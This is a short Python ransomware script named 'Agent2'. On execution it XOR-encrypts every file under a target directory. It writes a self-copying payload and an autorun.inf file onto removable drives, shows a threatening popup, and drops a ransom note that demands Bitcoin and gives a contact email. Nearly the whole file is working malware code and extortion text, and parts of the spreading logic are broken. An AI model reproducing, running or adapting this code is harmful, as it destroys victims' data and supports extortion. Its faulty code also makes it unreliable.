import os
import random
import string
from tkinter import Tk
from tkinter import messagebox

massage = '''Your files have been encrypted! 
Your computer has been infected with a agent2 ransomware virus. 
All your files have been encrypted and you have only one hour to pay the ransom if you want to get them back. 
If you don't pay, all your data will be lost forever. Don't try to restart your computer or shut it down, as it will only make things worse. 
The clock is ticking. 
Pay the ransom now, or suffer the consequences. 
Find the RANSOM_NOTE.txt for more information'''

title = "Your Files are locked"

def encrypt(file_path, password):
    with open(file_path, 'rb') as f:
        data = f.read()
    encrypted = bytearray()
    key = password.encode()
    for i, b in enumerate(data):
        encrypted.append(b ^ key[i % len(key)])
    with open(file_path, 'wb') as f:
        f.write(encrypted)

def display_popup_message(message):
    root = Tk()
    root.withdraw()
    messagebox.showerror('Error', message)
    root.destroy()


def get_files(path):
    file_list = []
    for dirpath, _, filenames in os.walk(path):
        for f in filenames:
            file_list.append(os.path.join(dirpath, f))
    return file_list

def ransomware(path, password):
    file_list = get_files(path)
    for f in file_list:
        encrypt(f, password)

def infect_removable_media(drive_letter, file_name, password):
    with open(file_name, 'w') as f:
        f.write('''
import os
import sys
import shutil

def encrypt(file_path, password):
    with open(file_path, 'rb') as f:
        data = f.read()
    encrypted = bytearray()
    key = password.encode()
    for i, b in enumerate(data):
        encrypted.append(b ^ key[i % len(key)])
    with open(file_path, 'wb') as f:
        f.write(encrypted)

def display_popup_message(message):
    root = Tk()
    root.withdraw()
    messagebox.showerror('Error', message)
    root.destroy()

def get_files(path):
    file_list = []
    for dirpath, _, filenames in os.walk(path):
        for f in filenames:
            file_list.append(os.path.join(dirpath, f))
    return file_list

def ransomware(path, password):
    file_list = get_files(path)
    for f in file_list:
        encrypt(f, password)

def infect_drives(password):
    drives = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    for drive in drives:
        try:
            shutil.copy(sys.argv[0], drive + ":\\")
            ransomware(drive + ":\\", password)
        except:
            pass

if __name__ == '__main__':
 '''.format(password))
    with open(os.path.join(drive_letter, 'autorun.inf'), 'w') as f:
        f.write('''
[AutoRun]
open={0}
'''.format(file_name))


# Usage example:
ransomware("/home/minodh/test", "minodh")
infect_removable_media("/media/minodh/KALI LINUX", "/media/minodh/KALI LINUX/my_file.py", "minodh")
os.system('zenity --warning --title="{}" --text="{}"'.format(title, massage))
with open("RANSOM_NOTE.txt", "w") as f:
    f.write('''Your files have been encrypted.
    Your computer has been infected with a deadly ransomware called Agent2. 
    All your files have been encrypted and you have only one hour to pay the ransom if you want to get them back. If you don't pay, all your data will be lost forever. 
    Don't try to restart your computer or shut it down, as it will only make things worse. The clock is ticking.
    Pay the ransom now, or suffer the consequences.
    To get them back, send 1 Bitcoin to the following address: Then, email agenthackers@gmail.com with your Bitcoin transaction ID and we will send you the decryption key.
    Oh! can't see the our bitcoind address then cry...!!!....!!!!''')

